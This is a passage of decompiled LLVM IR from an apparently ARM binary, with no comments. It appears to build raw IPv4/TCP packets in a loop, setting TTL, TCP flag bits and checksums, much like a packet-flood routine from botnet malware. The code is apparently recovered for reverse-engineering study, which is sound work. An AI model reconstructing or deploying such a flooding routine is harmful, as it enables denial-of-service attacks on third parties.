  %v1_cffc = urem i32 %v6_ce98, 2
  %v1_d000 = urem i32 %v6_ce50, 256
  %v4_d004 = mul nuw nsw i32 %v1_cfbc, 256
  %v5_d004 = or i32 %v4_d004, %v3_cfb8
  store i32 %v5_d004, i32* @r5, align 4
  %v3_d01826 = udiv i32 %v1_cf8c, 256
  store i32 %v3_d01826, i32* %r3.global-to-local, align 4
  store i32 %v1_cfbc, i32* %ip.global-to-local, align 4
  store i32 %v1_cf88, i32* %r1.global-to-local, align 4
  store i32 %v1_cf98, i32* %r2.global-to-local, align 4
  %v5_d034 = trunc i32 %v0_cf3c to i8
  store i32 0, i32* %r4.global-to-local, align 4
  %sext9 = mul i32 %v5_cd70, 16777216
  %v4_d090 = sdiv i32 %sext9, 16777216
  %sext10 = mul i32 %v0_cf38, 16777216
  %v4_d09c = sdiv i32 %sext10, 16777216
  %sext11 = mul i32 %tmp79, 16777216
  %v4_d0b0 = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v1_cf8c, 65536
  %v4_d0b4 = sdiv i32 %sext12, 16777216
  %tmp = sub nsw i32 0, %v1_cfc8
  %v4_d104 = and i32 %tmp, 32
  %tmp94 = sub nsw i32 0, %v1_cfcc
  %v4_d118 = and i32 %tmp94, 16
  %tmp95 = sub nsw i32 0, %v1_cfd0
  %v4_d12c = and i32 %tmp95, 8
  %tmp96 = sub nsw i32 0, %v1_cff4
  %v4_d140 = and i32 %tmp96, 4
  %tmp97 = sub nsw i32 0, %v1_cff8
  %v3_d154 = and i32 %tmp97, 2
  %sext13 = mul i32 %v0_cf40, 16777216
  %v7_d184 = sdiv i32 %sext13, 16777216
  %v1_d098 = trunc i32 %v4_d090 to i8
  %extract.t = trunc i32 %v4_d09c to i8
  %v3_d184 = sext i8 %v5_d034 to i32
  %v2_d1a8 = icmp eq i32 %v1_d000, 0
  br label %dec_label_pc_d040

dec_label_pc_d040:                                ; preds = %bb90, %dec_label_pc_cf6c
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d04c = call i32 @_calloc(i32 1510, i32 1)
  store i32 %v2_cd1c, i32* %ip.global-to-local, align 4
  %v2_d058 = load i32, i32* %r4.global-to-local, align 4
  %v5_d058 = mul i32 %v2_d058, 4
  %v6_d058 = add i32 %v5_d058, %v2_cd1c
  %v7_d058 = inttoptr i32 %v6_d058 to i32*
  store i32 %v2_d04c, i32* %v7_d058, align 4
  %v3_d05c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v0_d060 = load i32, i32* %ip.global-to-local, align 4
  %v4_d060 = mul i32 %v3_d05c, 4
  %v5_d060 = add i32 %v0_d060, %v4_d060
  %v6_d060 = inttoptr i32 %v5_d060 to i32*
  %v7_d060 = load i32, i32* %v6_d060, align 4
  store i32 %v7_d060, i32* @r7, align 4
  %v1_d064 = inttoptr i32 %v7_d060 to i8*
  %v2_d064 = load i8, i8* %v1_d064, align 1
  %tmp98 = urem i8 %v2_d064, 16
  %v1_d068 = zext i8 %tmp98 to i32
  %v1_d06c = or i32 %v1_d068, 64
  store i32 %v1_d06c, i32* %r2.global-to-local, align 4
  %v1_d070 = trunc i32 %v1_d06c to i8
  store i8 %v1_d070, i8* %v1_d064, align 1
  %v0_d074 = load i32, i32* @r7, align 4
  %v1_d074 = inttoptr i32 %v0_d074 to i8*
  %v2_d074 = load i8, i8* %v1_d074, align 1
  %v1_d078 = and i8 %v2_d074, -16
  %v1_d07c = or i8 %v1_d078, 5
  store i32 %v1_cd9c, i32* %r1.global-to-local, align 4
  store i8 %v1_d07c, i8* %v1_d074, align 1
  %v2_d08c = load i32, i32* @r7, align 4
  %v3_d08c = add i32 %v2_d08c, 1
  %v4_d08c = inttoptr i32 %v3_d08c to i8*
  store i8 %v5_cd54, i8* %v4_d08c, align 1
  store i32 %v4_d090, i32* %r3.global-to-local, align 4
  %v0_d094 = load i32, i32* %r1.global-to-local, align 4
  %v2_d094 = icmp eq i32 %v0_d094, 0
  store i1 %v2_d094, i1* %cpsr_z.global-to-local, align 1
  %v2_d098 = load i32, i32* @r7, align 4
  %v3_d098 = add i32 %v2_d098, 8
  %v4_d098 = inttoptr i32 %v3_d098 to i8*
  store i8 %v1_d098, i8* %v4_d098, align 1
  store i32 %v4_d09c, i32* %r2.global-to-local, align 4
  %v0_d0a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d0a0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d040
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d0a4 = load i32, i32* @r7, align 4
  %v4_d0a4 = add i32 %v3_d0a4, 6
  %v5_d0a4 = inttoptr i32 %v4_d0a4 to i8*
  store i8 64, i8* %v5_d0a4, align 1
  %v0_d0ac.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_d0ac.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d040, %bb
  %v0_d0ac.off0 = phi i8 [ %extract.t, %dec_label_pc_d040 ], [ %extract.t27, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_d0ac = load i32, i32* @r7, align 4
  %v3_d0ac = add i32 %v2_d0ac, 5
  %v4_d0ac = inttoptr i32 %v3_d0ac to i8*
  store i8 %v0_d0ac.off0, i8* %v4_d0ac, align 1
  store i32 %v4_d0b0, i32* %ip.global-to-local, align 4
  store i32 %v4_d0b4, i32* %r1.global-to-local, align 4
  %v0_d0b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d0b8, label %bb85, label %bb84

bb84:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %bb84
  %v0_d0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_d0bc = trunc i32 %v0_d0bc to i8
  %v2_d0bc = load i32, i32* @r7, align 4
  %v3_d0bc = add i32 %v2_d0bc, 9
  %v4_d0bc = inttoptr i32 %v3_d0bc to i8*
  store i8 %v1_d0bc, i8* %v4_d0bc, align 1
  %v0_d0c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d0c0, label %bb87, label %bb86

bb86:                                             ; preds = %bb85
  %v1_d0c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_d0c0 = trunc i32 %v1_d0c0 to i8
  %v3_d0c0 = load i32, i32* @r7, align 4
  %v4_d0c0 = add i32 %v3_d0c0, 7
  %v5_d0c0 = inttoptr i32 %v4_d0c0 to i8*
  store i8 %v2_d0c0, i8* %v5_d0c0, align 1
  br label %bb87

bb87:                                             ; preds = %bb85, %bb86
  %v3_d0c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d0c4, i32* %r2.global-to-local, align 4
  %v0_d0c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d0c8 = trunc i32 %v0_d0c8 to i8
  %v2_d0c8 = load i32, i32* @r7, align 4
  %v3_d0c8 = add i32 %v2_d0c8, 2
  %v4_d0c8 = inttoptr i32 %v3_d0c8 to i8*
  store i8 %v1_d0c8, i8* %v4_d0c8, align 1
  store i32 %v6_ceec, i32* %ip.global-to-local, align 4
  %v0_d0d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d0d0 = mul i32 %v0_d0d0, 32
  store i32 %v3_d0d0, i32* %r3.global-to-local, align 4
  %v1_d0d4 = load i32, i32* @r7, align 4
  %v2_d0d4 = add i32 %v1_d0d4, 12
  %v3_d0d4 = inttoptr i32 %v2_d0d4 to i32*
  store i32 %v6_ceec, i32* %v3_d0d4, align 4
  %v0_d0d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d0d8 = load i32, i32* %r2.global-to-local, align 4
  %tmp99 = mul i32 %v1_d0d8, -8
  %v5_d0d8 = add i32 %v0_d0d8, %tmp99
  %v1_d0dc = load i32, i32* @sb, align 4
  %v2_d0dc = add i32 %v1_d0dc, %v5_d0d8
  store i32 %v2_d0dc, i32* %r3.global-to-local, align 4
  %v1_d0e0 = add i32 %v2_d0dc, 16
  %v2_d0e0 = inttoptr i32 %v1_d0e0 to i32*
  %v3_d0e0 = load i32, i32* %v2_d0e0, align 4
  store i32 %v3_d0e0, i32* %r2.global-to-local, align 4
  %v0_d0e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d0e4 = trunc i32 %v0_d0e4 to i8
  %v2_d0e4 = load i32, i32* @r7, align 4
  %v3_d0e4 = add i32 %v2_d0e4, 3
  %v4_d0e4 = inttoptr i32 %v3_d0e4 to i8*
  store i8 %v1_d0e4, i8* %v4_d0e4, align 1
  %v0_d0e8 = load i32, i32* @r5, align 4
  %v1_d0e8 = trunc i32 %v0_d0e8 to i8
  %v2_d0e8 = load i32, i32* @r7, align 4
  %v3_d0e8 = add i32 %v2_d0e8, 4
  %v4_d0e8 = inttoptr i32 %v3_d0e8 to i8*
  store i8 %v1_d0e8, i8* %v4_d0e8, align 1
  %v0_d0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_d0ec = load i32, i32* @r7, align 4
  %v2_d0ec = add i32 %v1_d0ec, 16
  %v3_d0ec = inttoptr i32 %v2_d0ec to i32*
  store i32 %v0_d0ec, i32* %v3_d0ec, align 4
  %v0_d0f0 = load i32, i32* @sl, align 4
  %v1_d0f0 = trunc i32 %v0_d0f0 to i8
  %v2_d0f0 = load i32, i32* @r7, align 4
  %v3_d0f0 = add i32 %v2_d0f0, 20
  %v4_d0f0 = inttoptr i32 %v3_d0f0 to i8*
  store i8 %v1_d0f0, i8* %v4_d0f0, align 1
  %v0_d0f4 = load i32, i32* @r7, align 4
  %v1_d0f4 = add i32 %v0_d0f4, 20
  store i32 %v1_d0f4, i32* @r4, align 4
  %v1_d0f8 = add i32 %v0_d0f4, 33
  %v2_d0f8 = inttoptr i32 %v1_d0f8 to i8*
  %v3_d0f8 = load i8, i8* %v2_d0f8, align 1
  %v4_d0f8 = zext i8 %v3_d0f8 to i32
  store i32 %v1_cfc8, i32* %r1.global-to-local, align 4
  %v1_d100 = and i32 %v4_d0f8, 223
  %v5_d104 = or i32 %v1_d100, %v4_d104
  store i32 %v5_d104, i32* %r3.global-to-local, align 4
  %v1_d108 = trunc i32 %v5_d104 to i8
  store i8 %v1_d108, i8* %v2_d0f8, align 1
  %v0_d10c = load i32, i32* @r4, align 4
  %v1_d10c = add i32 %v0_d10c, 13
  %v2_d10c = inttoptr i32 %v1_d10c to i8*
  %v3_d10c = load i8, i8* %v2_d10c, align 1
  %v4_d10c = zext i8 %v3_d10c to i32
  store i32 %v1_cfcc, i32* %r3.global-to-local, align 4
  %v1_d114 = and i32 %v4_d10c, 239
  %v5_d118 = or i32 %v1_d114, %v4_d118
  store i32 %v5_d118, i32* %r2.global-to-local, align 4
  %v1_d11c = trunc i32 %v5_d118 to i8
  store i8 %v1_d11c, i8* %v2_d10c, align 1
  %v0_d120 = load i32, i32* @r4, align 4
  %v1_d120 = add i32 %v0_d120, 13
  %v2_d120 = inttoptr i32 %v1_d120 to i8*
  %v3_d120 = load i8, i8* %v2_d120, align 1
  %v4_d120 = zext i8 %v3_d120 to i32
  store i32 %v1_cfd0, i32* %ip.global-to-local, align 4
  %v1_d128 = and i32 %v4_d120, 247
  %v5_d12c = or i32 %v1_d128, %v4_d12c
  store i32 %v5_d12c, i32* %r3.global-to-local, align 4
  %v1_d130 = trunc i32 %v5_d12c to i8
  store i8 %v1_d130, i8* %v2_d120, align 1
  %v0_d134 = load i32, i32* @r4, align 4
  %v1_d134 = add i32 %v0_d134, 13
  %v2_d134 = inttoptr i32 %v1_d134 to i8*
  %v3_d134 = load i8, i8* %v2_d134, align 1
  %v4_d134 = zext i8 %v3_d134 to i32
  store i32 %v1_cff4, i32* %r1.global-to-local, align 4
  %v1_d13c = and i32 %v4_d134, 251
  %v5_d140 = or i32 %v1_d13c, %v4_d140
  store i32 %v5_d140, i32* %r2.global-to-local, align 4
  %v1_d144 = trunc i32 %v5_d140 to i8
  store i8 %v1_d144, i8* %v2_d134, align 1
  %v0_d148 = load i32, i32* @r4, align 4
  %v1_d148 = add i32 %v0_d148, 13
  %v2_d148 = inttoptr i32 %v1_d148 to i8*
  %v3_d148 = load i8, i8* %v2_d148, align 1
  %v4_d148 = zext i8 %v3_d148 to i32
  store i32 %v1_cff8, i32* %r2.global-to-local, align 4
  %v1_d150 = and i32 %v4_d148, 253
  %v4_d154 = or i32 %v1_d150, %v3_d154
  store i32 %v4_d154, i32* %r3.global-to-local, align 4
  %v1_d158 = trunc i32 %v4_d154 to i8
  store i8 %v1_d158, i8* %v2_d148, align 1
  %v0_d15c = load i32, i32* @r4, align 4
  %v1_d15c = add i32 %v0_d15c, 12
  %v2_d15c = inttoptr i32 %v1_d15c to i8*
  %v3_d15c = load i8, i8* %v2_d15c, align 1
  %v4_d15c = zext i8 %v3_d15c to i32
  store i32 %v4_d15c, i32* %r2.global-to-local, align 4
  %v1_d160 = add i32 %v0_d15c, 13
  %v2_d160 = inttoptr i32 %v1_d160 to i8*
  %v3_d160 = load i8, i8* %v2_d160, align 1
  %v4_d160 = zext i8 %v3_d160 to i32
  store i32 %v1_cffc, i32* %ip.global-to-local, align 4
  %tmp100 = urem i8 %v3_d15c, 16
  %v1_d168 = zext i8 %tmp100 to i32
  %v1_d16c = and i32 %v4_d160, 254
  %v2_d170 = or i32 %v1_d16c, %v1_cffc
  store i32 %v2_d170, i32* %r3.global-to-local, align 4
  %v1_d174 = or i32 %v1_d168, 80
  store i32 %v1_d174, i32* %r2.global-to-local, align 4
  %v1_d178 = trunc i32 %v2_d170 to i8
  store i8 %v1_d178, i8* %v2_d160, align 1
  %v0_d17c = load i32, i32* %r2.global-to-local, align 4
  %v1_d17c = trunc i32 %v0_d17c to i8
  %v2_d17c = load i32, i32* @r4, align 4
  %v3_d17c = add i32 %v2_d17c, 12
  %v4_d17c = inttoptr i32 %v3_d17c to i8*
  store i8 %v1_d17c, i8* %v4_d17c, align 1
  store i32 %v3_d184, i32* %r1.global-to-local, align 4
  store i32 %v7_d184, i32* %r2.global-to-local, align 4
  %v2_d188 = load i32, i32* @r4, align 4
  %v3_d188 = add i32 %v2_d188, 1
  %v4_d188 = inttoptr i32 %v3_d188 to i8*
  store i8 %v5_d034, i8* %v4_d188, align 1
  %v0_d18c = load i32, i32* %r2.global-to-local, align 4
  %v1_d18c = trunc i32 %v0_d18c to i8
  %v2_d18c = load i32, i32* @r4, align 4
  %v3_d18c = add i32 %v2_d18c, 3
  %v4_d18c = inttoptr i32 %v3_d18c to i8*
  store i8 %v1_d18c, i8* %v4_d18c, align 1
  %v0_d190 = load i32, i32* @r6, align 4
  %v1_d190 = trunc i32 %v0_d190 to i8
  %v2_d190 = load i32, i32* @r4, align 4
  %v3_d190 = add i32 %v2_d190, 2
  %v4_d190 = inttoptr i32 %v3_d190 to i8*
  store i8 %v1_d190, i8* %v4_d190, align 1
  %v0_d194 = load i32, i32* @r8, align 4
  %v1_d194 = load i32, i32* @r4, align 4
  %v2_d194 = add i32 %v1_d194, 4
  %v3_d194 = inttoptr i32 %v2_d194 to i32*
  store i32 %v0_d194, i32* %v3_d194, align 4
  %v0_d198 = call i32 @function_10bd8()
  store i32 %v1_d000, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_d198, 16777216
  %v1_d1a0 = sdiv i32 %sext, 16777216
  store i32 %v1_d1a0, i32* %r2.global-to-local, align 4
  %v3_d1a4 = ashr i32 %sext, 31
  store i32 %v3_d1a4, i32* %r3.global-to-local, align 4
  store i1 %v2_d1a8, i1* %cpsr_z.global-to-local, align 1
  %v1_d1ac = trunc i32 %v3_d1a4 to i8
  %v2_d1ac = load i32, i32* @r4, align 4
  %v3_d1ac = add i32 %v2_d1ac, 15
  %v4_d1ac = inttoptr i32 %v3_d1ac to i8*
  store i8 %v1_d1ac, i8* %v4_d1ac, align 1
  %v0_d1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_d1bc.pre = load i32, i32* @r4, align 4
  br i1 %v0_d1b0, label %.thread14, label %bb88

bb88:                                             ; preds = %bb87
  %v2_d1b0 = add i32 %v2_d1bc.pre, 13
  %v3_d1b0 = inttoptr i32 %v2_d1b0 to i8*
  %v4_d1b0 = load i8, i8* %v3_d1b0, align 1
  %v5_d1b0 = zext i8 %v4_d1b0 to i32
  %v2_d1b4 = or i32 %v5_d1b0, 8
  store i32 %v2_d1b4, i32* %r3.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb87, %bb88
  store i32 %v6_ceb0, i32* @r1, align 4
  %v0_d1bc = load i32, i32* %r2.global-to-local, align 4
  %v1_d1bc = trunc i32 %v0_d1bc to i8
  %v3_d1bc = add i32 %v2_d1bc.pre, 14
  %v4_d1bc = inttoptr i32 %v3_d1bc to i8*
  store i8 %v1_d1bc, i8* %v4_d1bc, align 1
  %v0_d1c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d1c0, label %bb90, label %bb89

bb89:                                             ; preds = %.thread14
  %v1_d1c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1c0 = trunc i32 %v1_d1c0 to i8
  %v3_d1c0 = load i32, i32* @r4, align 4
  %v4_d1c0 = add i32 %v3_d1c0, 13
  %v5_d1c0 = inttoptr i32 %v4_d1c0 to i8*
  store i8 %v2_d1c0, i8* %v5_d1c0, align 1
  br label %bb90

bb90:                                             ; preds = %.thread14, %bb89
  %v0_d1c4 = load i32, i32* @r7, align 4
  %v1_d1c4 = add i32 %v0_d1c4, 40
  %v1_d1c8 = inttoptr i32 %v1_d1c4 to i8*
  %v2_d1c8 = call i32 @function_10db4(i8* %v1_d1c8)
  %v3_d1cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d1cc, i32* %r3.global-to-local, align 4
  %v1_d1d0 = add i32 %v3_d1cc, 1
  store i32 %v1_d1d0, i32* %r4.global-to-local, align 4
  %v0_d1d4 = load i32, i32* @fp, align 4
  %v9_d1d4 = icmp eq i32 %v0_d1d4, %v1_d1d0
  store i1 %v9_d1d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d1d0, i32* %stack_var_-40, align 4
  %v8_d1dc = icmp sgt i32 %v0_d1d4, %v1_d1d0
  br i1 %v8_d1dc, label %dec_label_pc_d040, label %dec_label_pc_d1e0

dec_label_pc_d1e0:                                ; preds = %bb90
  store i32 %v6_ceb0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d1e8.preheader

dec_label_pc_d1e8.preheader:                      ; preds = %dec_label_pc_d1e0, %dec_label_pc_d454
  %v0_d1e818 = phi i32 [ %v0_d1d4, %dec_label_pc_d1e0 ], [ %v0_cf54, %dec_label_pc_d454 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_cf74, %dec_label_pc_d1e0 ], [ %v1_d45c, %dec_label_pc_d454 ]
  %storemerge = add i32 %v6_ceb0, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_d3a0 = icmp eq i32 %v6_ceec, -1
  %v8_d3a0 = icmp eq i32 %v6_ceec, -1
  %v3_d3bc = icmp eq i32 %v3_cf48, 65535
  %v2_d438 = icmp eq i32 %v1_ced8, 0
  br label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d290, %dec_label_pc_d1e8.preheader
  %v0_d1e8 = phi i32 [ %v0_d1e818, %dec_label_pc_d1e8.preheader ], [ %v0_d324, %dec_label_pc_d290 ]
  %v2_d1e8 = icmp eq i32 %v0_d1e8, 0
  store i1 %v2_d1e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp91 = icmp slt i32 %v0_d1e8, 1
  br label %dec_label_pc_d1f0

dec_label_pc_d1f0:                                ; preds = %dec_label_pc_d1f0, %dec_label_pc_d1e8
  br i1 %tmp91, label %dec_label_pc_d1f0, label %dec_label_pc_d1f4

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1f0
  %v0_d1f4 = load i32, i32* @r8, align 4
  %v3_d1f4 = mul i32 %v0_d1f4, 65536
  store i32 %v3_d1f4, i32* %r2.global-to-local, align 4
  %tmp92 = mul i32 %v0_d1f4, 256
  %v1_d1fc = and i32 %tmp92, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  store i32 %v1_d1fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp93 = udiv i32 %v0_d1f4, 256
  %v4_d208 = urem i32 %tmp93, 256
  %v5_d208 = or i32 %v4_d208, %v1_d1fc
  store i32 %v5_d208, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_d210

dec_label_pc_d210:                                ; preds = %dec_label_pc_d290, %dec_label_pc_d1f4
  %v1_d224 = phi i32 [ %v1_d320, %dec_label_pc_d290 ], [ 0, %dec_label_pc_d1f4 ]
  %v5_d214 = mul i32 %v1_d224, 24
  %v1_d218 = load i32, i32* @sb, align 4
  %v2_d218 = add i32 %v1_d218, %v5_d214
  store i32 %v2_d218, i32* %r3.global-to-local, align 4
  store i32 %v2_cd1c, i32* %ip.global-to-local, align 4
  %v1_d220 = add i32 %v2_d218, 20
  %v2_d220 = inttoptr i32 %v1_d220 to i8*
  %v3_d220 = load i8, i8* %v2_d220, align 1
  %v4_d220 = zext i8 %v3_d220 to i32
  store i32 %v4_d220, i32* %r2.global-to-local, align 4
  %v4_d224 = mul i32 %v1_d224, 4
  %v5_d224 = add i32 %v4_d224, %v2_cd1c
  %v6_d224 = inttoptr i32 %v5_d224 to i32*
  %v7_d224 = load i32, i32* %v6_d224, align 4
  store i32 %v7_d224, i32* @r5, align 4
  %v7_d228 = icmp eq i8 %v3_d220, 31
  store i1 %v7_d228, i1* %cpsr_z.global-to-local, align 1
  %v1_d22c = add i32 %v7_d224, 20
  store i32 %v1_d22c, i32* @r6, align 4
  %tmp101 = icmp ult i8 %v3_d220, 32
  br i1 %tmp101, label %dec_label_pc_d344, label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d210
  store i32 %v6_ceec, i32* %r1.global-to-local, align 4
  store i1 %v8_d3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d3a0, label %dec_label_pc_d3ac, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d344, %dec_label_pc_d234
  store i32 %v3_cf48, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d3bc, label %dec_label_pc_d3c8, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d3ac.dec_label_pc_d254_crit_edge, %dec_label_pc_d240
  %v1_d258 = phi i32 [ %v1_d258.pre, %dec_label_pc_d3ac.dec_label_pc_d254_crit_edge ], [ 65535, %dec_label_pc_d240 ]
  store i32 %v3_cf4c, i32* %r3.global-to-local, align 4
  %v9_d258 = icmp eq i32 %v3_cf4c, %v1_d258
  store i1 %v9_d258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d258, label %dec_label_pc_d3e4, label %dec_label_pc_d260

dec_label_pc_d260:                                ; preds = %dec_label_pc_d3c8.dec_label_pc_d260_crit_edge, %dec_label_pc_d254
  %v1_d264 = phi i32 [ %v1_d264.pre, %dec_label_pc_d3c8.dec_label_pc_d260_crit_edge ], [ %v1_d258, %dec_label_pc_d254 ]
  store i32 %v3_cf50, i32* %ip.global-to-local, align 4
  %v9_d264 = icmp eq i32 %v3_cf50, %v1_d264
  store i1 %v9_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d264, label %dec_label_pc_d400, label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d3e4.dec_label_pc_d26c_crit_edge, %dec_label_pc_d260
  %v1_d270 = phi i32 [ %v1_d270.pre, %dec_label_pc_d3e4.dec_label_pc_d26c_crit_edge ], [ %v1_d264, %dec_label_pc_d260 ]
  store i32 %v5_cdec, i32* %r1.global-to-local, align 4
  %v9_d270 = icmp eq i32 %v5_cdec, %v1_d270
  store i1 %v9_d270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d270, label %dec_label_pc_d41c, label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d400.dec_label_pc_d278_crit_edge, %dec_label_pc_d26c
  %v1_d27c = phi i32 [ %v1_d27c.pre, %dec_label_pc_d400.dec_label_pc_d278_crit_edge ], [ %v1_d270, %dec_label_pc_d26c ]
  store i32 %v6_ce08, i32* %r2.global-to-local, align 4
  %v9_d27c = icmp eq i32 %v6_ce08, %v1_d27c
  store i1 %v9_d27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d27c, label %dec_label_pc_d430, label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d41c, %dec_label_pc_d278
  store i32 %v1_ced8, i32* %r3.global-to-local, align 4
  store i1 %v2_d438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d438, label %dec_label_pc_d290, label %dec_label_pc_d444

dec_label_pc_d290:                                ; preds = %dec_label_pc_d284, %dec_label_pc_d430, %dec_label_pc_d444
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d294 = load i32, i32* @r7, align 4
  %v1_d294 = trunc i32 %v0_d294 to i8
  %v2_d294 = load i32, i32* @r5, align 4
  %v3_d294 = add i32 %v2_d294, 10
  %v4_d294 = inttoptr i32 %v3_d294 to i8*
  store i8 %v1_d294, i8* %v4_d294, align 1
  %v0_d298 = load i32, i32* @r7, align 4
  %v1_d298 = trunc i32 %v0_d298 to i8
  %v2_d298 = load i32, i32* @r5, align 4
  %v3_d298 = add i32 %v2_d298, 11
  %v4_d298 = inttoptr i32 %v3_d298 to i8*
  store i8 %v1_d298, i8* %v4_d298, align 1
  %v0_d29c = load i32, i32* @r5, align 4
  store i32 %v0_d29c, i32* @r0, align 4
  %v2_d2a0 = call i32 @function_f19c(i32 %v0_d29c, i32 20)
  %v3_d2a0 = trunc i32 %v2_d2a0 to i8
  %v4_d2a429 = udiv i32 %v2_d2a0, 256
  %v1_d2a8 = trunc i32 %v4_d2a429 to i8
  %v2_d2a8 = load i32, i32* @r5, align 4
  %v3_d2a8 = add i32 %v2_d2a8, 11
  %v4_d2a8 = inttoptr i32 %v3_d2a8 to i8*
  store i8 %v1_d2a8, i8* %v4_d2a8, align 1
  %v3_d2ac = load i32, i32* @r5, align 4
  %v4_d2ac = add i32 %v3_d2ac, 10
  %v5_d2ac = inttoptr i32 %v4_d2ac to i8*
  store i8 %v3_d2a0, i8* %v5_d2ac, align 1
  %v0_d2b0 = load i32, i32* @r6, align 4
  store i32 %v0_d2b0, i32* @r1, align 4
  %v0_d2b4 = load i32, i32* @sl, align 4
  store i32 %v0_d2b4, i32* %r2.global-to-local, align 4
  %v0_d2b8 = load i32, i32* @r8, align 4
  store i32 %v0_d2b8, i32* %r3.global-to-local, align 4
  %v0_d2bc = load i32, i32* @r7, align 4
  %v1_d2bc = trunc i32 %v0_d2bc to i8
  %v3_d2bc = add i32 %v0_d2b0, 16
  %v4_d2bc = inttoptr i32 %v3_d2bc to i8*
  store i8 %v1_d2bc, i8* %v4_d2bc, align 1
  %v0_d2c0 = load i32, i32* @r7, align 4
  %v1_d2c0 = trunc i32 %v0_d2c0 to i8
  %v2_d2c0 = load i32, i32* @r6, align 4
  %v3_d2c0 = add i32 %v2_d2c0, 17
  %v4_d2c0 = inttoptr i32 %v3_d2c0 to i8*
  store i8 %v1_d2c0, i8* %v4_d2c0, align 1
  %v0_d2c4 = load i32, i32* @r5, align 4
  %v4_d2c8 = call i32 @function_f1f8(i32 %v0_d2c4, i32 %v0_d2b0, i32 %v0_d2b4, i32 %v0_d2b8)
  %v5_d2c8 = trunc i32 %v4_d2c8 to i8
  %v4_d2cc30 = udiv i32 %v4_d2c8, 256
  %v1_d2d0 = trunc i32 %v4_d2cc30 to i8
  %v2_d2d0 = load i32, i32* @r6, align 4
  %v3_d2d0 = add i32 %v2_d2d0, 17
  %v4_d2d0 = inttoptr i32 %v3_d2d0 to i8*
  store i8 %v1_d2d0, i8* %v4_d2d0, align 1
  %v3_d2d4 = load i32, i32* @r6, align 4
  %v4_d2d4 = add i32 %v3_d2d4, 16
  %v5_d2d4 = inttoptr i32 %v4_d2d4 to i8*
  store i8 %v5_d2c8, i8* %v5_d2d4, align 1
  %v3_d2d8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d2d8, i32* %r3.global-to-local, align 4
  %v0_d2dc = load i32, i32* @r5, align 4
  %v1_d2dc = add i32 %v0_d2dc, 20
  %v2_d2dc = inttoptr i32 %v1_d2dc to i32*
  %v3_d2dc = load i32, i32* %v2_d2dc, align 4
  %v3_d2e4 = udiv i32 %v3_d2dc, 65536
  store i32 %v3_d2e4, i32* %r2.global-to-local, align 4
  %v5_d2e8 = mul i32 %v3_d2d8, 24
  %v1_d2ec = load i32, i32* @sb, align 4
  %v2_d2ec = add i32 %v1_d2ec, %v5_d2e8
  store i32 %v2_d2ec, i32* %ip.global-to-local, align 4
  %v3_d2f028 = udiv i32 %v3_d2dc, 16777216
  %v1_d2f4 = trunc i32 %v3_d2f028 to i8
  %v3_d2f4 = add i32 %v2_d2ec, 3
  %v4_d2f4 = inttoptr i32 %v3_d2f4 to i8*
  store i8 %v1_d2f4, i8* %v4_d2f4, align 1
  %v0_d2f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d2f8 = trunc i32 %v0_d2f8 to i8
  %v2_d2f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_d2f8 = add i32 %v2_d2f8, 2
  %v4_d2f8 = inttoptr i32 %v3_d2f8 to i8*
